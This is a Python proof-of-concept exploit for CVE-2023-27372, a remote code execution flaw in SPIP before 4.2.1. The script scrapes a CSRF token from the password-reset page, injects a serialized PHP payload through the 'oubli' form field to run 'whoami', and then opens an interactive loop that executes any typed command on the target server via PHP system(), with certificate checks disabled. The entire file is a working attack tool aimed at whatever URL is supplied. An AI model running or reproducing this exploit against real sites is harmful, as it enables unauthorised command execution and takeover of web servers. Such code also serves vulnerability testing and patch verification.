import re
import bs4
import sys
import base64
import argparse
import requests
from time import sleep
from lxml import html
from urllib.parse import urlparse

class SPipRCEPoC:
    def __init__(self):
        self.options = self.parseArgs()

    def parseArgs(self):
        parser = argparse.ArgumentParser(description="CVE-2023-27372 SPIP < 4.2.1 - RCE PoC")
        parser.add_argument("-u", "--url", default=None, help="SPIP application domain E.g., https://url.com")
        args = parser.parse_args()

        if args.url is None:
            parser.print_help()
            sys.exit(1)

        return args

    def get_csrf(self, url):
        r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=5, verify=False)
        tree = html.fromstring(r.content)
        csrf_input = tree.xpath('//input[@name="formulaire_action_args"]')
        if csrf_input:
            csrf_value = csrf_input[0].get('value')
            return csrf_value
        else:
            return -1


    def payload(self, url, csrf, payload):
        data = {
            "page": "spip_pass",
            "formulaire_action": "oubli", 
            "formulaire_action_args": csrf,
            "oubli": payload # oubli = vuln param
        }
        r = requests.post('%s/spip.php?page=spip_pass' % url, data=data, timeout=10, verify=False)
        return r.text

    def parse_output(self, text):
        pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
        matches = pattern.findall(text)
        return "\n".join(matches)

    def furl(self, url):
        parsed_url = urlparse(url)
        return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"

    def check_2(self, url):
        csrf = self.get_csrf(url)
        if csrf == -1:
            print("[-] Unable to grab CSRF Token")
            print("[!] Ensure to retry this a minimum of 3-5 times as sometimes it is unable to grab it, this doesn't mean your target isn't vulnerable.")
            return

        cmd = "echo [S] ; whoami ; echo [E]"
        cmd_encoded = base64.b64encode(cmd.encode()).decode()
        command_str = "<?php exec(base64_decode('{}')); ?>".format(cmd_encoded)
        payload = "s:{}:\"{}\";".format(len(command_str), command_str)

        vulnerable = False
        for _ in range(2):
            output = self.payload(url=url, csrf=csrf, payload=payload)
            if output:
                vulnerable = True
                if 'whoami' in output:
                    print("[!] The Target {} is vulnerable but achieving RCE failed?".format(url)) # figure out why later (if I have time)
                else:
                    print("[+] The Target {} is vulnerable".format(url))
                break

        if not vulnerable:
            print("[-] The Target {} is not vulnerable".format(url))
        else:
            print("[!] Spawning interactive shell")
            sleep(2)
            print("[!] Shell spawned successfully. Ensure to re-type commands in the event they do not provide output.")
            while True:
                try:
                    cmd = input("$ ")
                    if cmd.lower() == "exit":
                        break

                    command_str = "<?php system('echo [' . 'S' . '] ; ' . '{}' . '; echo [' . 'E' . '] ;');?>".format(cmd)
                    payload = "s:{}:\"{}\";".format(len(command_str), command_str)
                    csrf = self.get_csrf(url=url)
                    result = self.payload(url=url, csrf=csrf, payload=payload)
                    output = self.parse_output(result)
                    print(output)

                except KeyboardInterrupt:
                    print("[+] Exiting...")
                    break

    def check(self, url):
        csrf = self.get_csrf(url)
        if csrf == -1:
            return False

        cmd = "echo [S] ; whoami ; echo [E]"
        cmd_encoded = base64.b64encode(cmd.encode()).decode()
        command_str = "<?php exec(base64_decode('{}')); ?>".format(cmd_encoded)
        payload = "s:{}:\"{}\";".format(len(command_str), command_str)
        result = self.payload(url=url, csrf=csrf, payload=payload)
        output = self.parse_output(result)

        if output:
            return output
        else:
            return False

    def run(self):
        options = self.options

        requests.packages.urllib3.disable_warnings()
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        except AttributeError:
            pass

        if options.url:
            self.check_2(options.url)
        else:
            print("[-] URL not provided")

if __name__ == '__main__':
    exploit = SPipRCEPoC()
    exploit.run()